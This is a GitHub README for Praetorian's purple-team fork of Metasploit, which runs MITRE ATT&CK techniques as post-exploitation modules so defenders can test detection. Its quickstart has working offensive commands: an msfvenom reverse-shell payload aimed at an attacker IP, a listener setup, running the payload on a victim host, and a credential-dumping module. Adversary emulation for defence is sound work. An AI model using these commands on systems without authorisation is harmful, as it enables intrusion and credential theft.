The Metasploit Framework is released under a BSD-style license. See
[COPYING](COPYING) for more details.
# Purple Team ATT&CK&trade; Automation

At Praetorian, we were seeking a way to automatically emulate adversary tactics in order to evaluate detection and response capabilities. Our solution implements MITRE ATT&CK&trade; TTPs as Metasploit Framework `post` modules. As of this release, we've automated a little over 100 TTPs as modules.

Metasploit's advantage is its robust library, capability to interact with operating system APIs, and its flexible license. In addition, we're able to emulate the features of other tools such as in-memory .NET execution via leveraging Metasploit's `execute_powershell` functionality. This allows Blue Teams to ensure that their tools are alerting on the actual TTP behavior and not execution artifacts (such as encoded PowerShell).

Our solution is built on top of the latest version of Metasploit as of 09Apr2019 (pulled from: https://github.com/rapid7/metasploit-framework). We’ve made minor modifications to Metasploit’s code base to enable some of the automation. Everything should work as intended if you’re already familiar with Metasploit. The magic happens after you establish a Meterpreter session and run a TTP as a post-exploitation module.

We're open sourcing our work because we believe in solving the cybersecurity problem. By giving Blue Teams more tools to emulate adversary behavior, we hope to improve their capabilities and reduce the still very high average dwell time.

## Wiki

For detailed opertional [usage guidance](https://github.com/praetorian-inc/purple-team-attack-automation/wiki/Operational-Setup-and-Usage) and a full [list of modules](https://github.com/praetorian-inc/purple-team-attack-automation/wiki/Available-Modules) and changes, please view the [GitHub Wiki](https://github.com/praetorian-inc/purple-team-attack-automation/wiki).

## Quickstart

[![Quick start video guide](https://img.youtube.com/vi/o3Qb_0clIpg/0.jpg)](https://www.youtube.com/watch?v=o3Qb_0clIpg)

Quick start video guide: [https://youtu.be/o3Qb_0clIpg](https://youtu.be/o3Qb_0clIpg)

Installation should follow the instructions for installing a Metasploit Docker environment:
https://github.com/rapid7/metasploit-framework/tree/master/docker

In general:
 * Install Docker
 * `git clone https://github.com/praetorian-code/purple-team-attack-automation.git`
 * Edit `./docker-compose.local.override.yml` to reflect the LHOST of your local system similar to below. By default, port 4444 will be forwarded to the docker container. If you want to use other ports, for instance to mirror HTTPS, you'll have to add them to this file.

```
version: '3'
services:
  ms:
    environment:
      # example of setting LHOST
      LHOST: 10.0.8.2
    # example of adding more ports
    ports:
      - 8080:8080
      - 443:443
```

 * Add / Remove further ports or IP addresses as you see fit. Don't forget to change the LHOST to your own IP address.
 * Make sure you set `LHOST` to valid hostname that resolves to your host machine.
 * Now you need to set the `COMPOSE_FILE` environment variable to load your local override.
 ```
 echo "COMPOSE_FILE=./docker-compose.yml:./docker-compose.override.yml:./docker-compose.local.override.yml" >> .env
```
 * `docker-compose build`
 * Start the container with `./docker/bin/msfconsole`
 *	Generate a Meterpreter payload:
 ```
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Attacker IP Address> LPORT=4444 -f exe > meterpreter.exe
 ```
 *	Start and run a local listener: 
 ```
  use exploit/multi/handler
  set PAYLOAD windows/meterpreter/reverse_tcp
  set LHOST <Attacker IP Address>
  set LPORT 4444
  exploit -j -z
  ```
  Copy and run meterpreter.exe on the target (“victim”) host as admin and wait for a session.
*	Run a TTP as a post-exploitation module. The list of modules is provided below. For example, to start the 'Credential Dumping (T1003)’ module, run:  
```
use modules/post/windows/purple/t1003
info
set session 1
run
```

### Meterpreter Payloads

Praetorian recommends you utilize [the nightly installers](https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers) in order to run msfvenom to create your payloads.

### Common Errors

```
ERROR: Couldn't connect to Docker daemon at http+docker://localunixsocket - is it running?
```

Solved by
```
service docker start
```

## Future Work

* Integrate the container into a fork of [DetectionLab](https://github.com/clong/DetectionLab)
* Compare execution of CALDERA and MSF and how artifacts differ so we can improve adversary emulation
* Leverage the [MSFRPCD](https://metasploit.help.rapid7.com/docs/running-metasploit-remotely) to facilitate automatic attack chaining

## Contact

If you're interested in our Purple Team services, please [contact us](https://www.praetorian.com/contact) online or read more about "[Why Praetorian Benchmarks to MITRE ATT&CK™ and Why You Should Too](https://p16.praetorian.com/blog/why-praetorian-benchmarks-to-mitre-attack?utm_campaign=blog&utm_medium=social&utm_source=github)".

If you're an engineer looking to join our great team, we have openings at [our careers page](https://www.praetorian.com/company/careers).

## Contributing

See the [Contribution Guide](https://github.com/praetorian-inc/purple-team-attack-automation/blob/master/CONTRIBUTING.md) for a step-by-step guide to making a module.

Also, follow the [Metasploit Framework's general contributing guidelines](https://github.com/rapid7/metasploit-framework/blob/master/CONTRIBUTING.md).

## Acknowledgements

We'd like to thank various members of the security community for providing a lot of the techniques and code that we integrated into this project. 

* [MITRE ATT&CK&trade;](https://attack.mitre.org/) (Obviously)
* [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team)
* [@subtee](https://twitter.com/subTee)
* [LOLBAS Project](https://lolbas-project.github.io/)
* [CALDERA](https://github.com/mitre/caldera)

At Praetorian, the following engineers helped contribute modules:
* Josh Abraham `jabra [at] spl0it.org` and [@jabra](https://twitter.com/Jabra)
* Abraham Adberstein
* Tanner Harper
* Thomas Hendrickson [github.com/tomis007](https://www.github.com/tomis007)
* George Jouldjian 
* Dallas Kaman
* Blake Luther
* Matt Schneider
* Matthew Verrette
* Daniel Wyleczuk-Stern [@daniel_infosec](https://twitter.com/Daniel_Infosec)
